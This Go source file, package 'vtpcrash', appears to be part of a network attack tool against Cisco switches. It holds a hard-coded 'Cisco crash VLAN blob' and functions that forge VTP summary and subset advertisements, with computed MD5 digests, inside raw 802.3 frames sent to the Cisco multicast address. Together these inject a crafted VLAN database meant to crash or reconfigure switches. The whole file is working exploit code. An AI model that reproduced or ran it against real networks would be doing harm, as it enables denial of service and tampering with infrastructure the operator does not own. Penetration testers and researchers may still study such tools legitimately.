package vtpcrash

import (
	"crypto/md5"
	"encoding/binary"
	"fmt"
	"net"
)

const (
	vtpCodeSummary = 0x01
	vtpCodeSubset  = 0x02
	vtpCodeRequest = 0x03
	vtpCodeJoin    = 0x04

	vtpDomainSize  = 32
	vtpSummarySize = 72
	vtpSubsetHdr   = 40
)

var (
	vtpDstMAC = [6]byte{0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc}
	vtpLLC    = [8]byte{0xaa, 0xaa, 0x03, 0x00, 0x00, 0x0c, 0x20, 0x03}

	// Cisco crash VLAN blob.
	vlanCiscoCrash = []byte{
		0x75, 0x00, 0x01, 0x07, 0x20, 0x00, 0x02, 0x0c,
		0x03, 0xea, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8a,
		0x66, 0x64, 0x64, 0x69, 0x2d, 0x64, 0x65, 0x66,
		0x61, 0x75, 0x6c, 0x74, 0x01, 0x01, 0x00, 0x00,
		0x04, 0x01, 0x00, 0x00, 0x28, 0x00, 0x03, 0x12,
		0x03, 0xeb, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8b,
		0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x2d, 0x72, 0x69,
		0x6e, 0x67, 0x2d, 0x64, 0x65, 0x66, 0x61, 0x75,
		0x6c, 0x74, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
		0x04, 0x01, 0x00, 0x00, 0x24, 0x00, 0x04, 0x0f,
		0x03, 0xec, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8c,
		0x66, 0x64, 0x64, 0x69, 0x6e, 0x65, 0x74, 0x2d,
		0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x00,
		0x02, 0x01, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01,
		0x24, 0x00, 0x05, 0x0d, 0x03, 0xed, 0x05, 0xdc,
		0x00, 0x01, 0x8a, 0x8d, 0x74, 0x72, 0x6e, 0x65,
		0x74, 0x2d, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c,
		0x74, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00,
		0x03, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0xf1, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x0c, 0x20,
	}
)

type learnedVTP struct {
	Version   byte
	Code      byte
	Domain    []byte
	DomLen    int
	Revision  uint32
	Updater   uint32
	Followers byte
	Seq       byte
	VlanData  []byte
	Timestamp [12]byte
}

func generateVTPMD5(updater, revision uint32, domain []byte, domLen int, vlans []byte, version byte) []byte {
	buf := make([]byte, 16+vtpSummarySize+len(vlans)+16)
	summ := buf[16:]
	summ[0] = version
	summ[1] = vtpCodeSummary
	if domLen > vtpDomainSize {
		domLen = vtpDomainSize
	}
	summ[3] = byte(domLen)
	copy(summ[4:4+vtpDomainSize], domain)
	binary.BigEndian.PutUint32(summ[36:40], revision)
	binary.BigEndian.PutUint32(summ[40:44], updater)
	copy(buf[16+vtpSummarySize:], vlans)
	hash := md5.Sum(buf[:32+vtpSummarySize+len(vlans)])
	return hash[:]
}

func buildSummaryFrame(srcMAC net.HardwareAddr, version byte, followers byte, domain []byte, domLen int, revision, updater uint32, timestamp, digest []byte) []byte {
	body := make([]byte, vtpSummarySize)
	body[0] = version
	body[1] = vtpCodeSummary
	body[2] = followers
	if domLen > vtpDomainSize {
		domLen = vtpDomainSize
	}
	body[3] = byte(domLen)
	copy(body[4:4+vtpDomainSize], domain)
	binary.BigEndian.PutUint32(body[36:40], revision)
	binary.BigEndian.PutUint32(body[40:44], updater)
	if len(timestamp) >= 12 {
		copy(body[44:56], timestamp[:12])
	}
	if len(digest) >= 16 {
		copy(body[56:72], digest[:16])
	}
	return buildVTP8023Frame(srcMAC, body)
}

func buildSubsetFrame(srcMAC net.HardwareAddr, version byte, seq byte, domain []byte, domLen int, revision uint32, vlanData []byte) []byte {
	body := make([]byte, vtpSubsetHdr+len(vlanData))
	body[0] = version
	body[1] = vtpCodeSubset
	body[2] = seq
	if domLen > vtpDomainSize {
		domLen = vtpDomainSize
	}
	body[3] = byte(domLen)
	copy(body[4:4+vtpDomainSize], domain)
	binary.BigEndian.PutUint32(body[36:40], revision)
	copy(body[vtpSubsetHdr:], vlanData)
	return buildVTP8023Frame(srcMAC, body)
}

func buildVTP8023Frame(srcMAC net.HardwareAddr, vtpBody []byte) []byte {
	payloadLen := len(vtpLLC) + len(vtpBody)
	frame := make([]byte, 14+payloadLen)
	copy(frame[0:6], vtpDstMAC[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], uint16(payloadLen))
	copy(frame[14:22], vtpLLC[:])
	copy(frame[22:], vtpBody)
	return frame
}

func formatMAC(mac []byte) string {
	if len(mac) != 6 {
		return "unknown"
	}
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
}

func macEqual(a, b []byte) bool {
	if len(a) != 6 || len(b) != 6 {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
